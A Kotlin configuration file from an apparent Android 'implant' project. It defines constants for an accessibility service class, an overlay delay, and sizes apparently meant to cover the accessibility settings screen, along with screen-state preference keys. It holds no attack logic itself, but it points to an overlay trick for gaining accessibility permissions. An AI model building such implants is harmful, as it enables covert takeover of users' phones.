package com.cooperthecoder.implant

import android.app.AlarmManager
import java.util.*

object Config {
    const val OVERLAY_DELAY: Long = 2000L
    @JvmField val ACCESSIBILITY_SERVICE_CLASS = DaggerService::class.java
    const val ACCESSIBILITY_SETTINGS_HEIGHT = 240
    const val ACCESSIBILITY_SETTINGS_TOP_PADDING = 240
    const val SYSTEMUI_PACKAGE_NAME = "com.android.systemui"
    const val SHARED_PREFERENCES_NAME = "screen_state"
    const val PREFS_KEY_SCREEN_STATE = "last_screen_state"
    const val PREFS_KEY_STATE_TIMESTAMP = "timestamp"
}

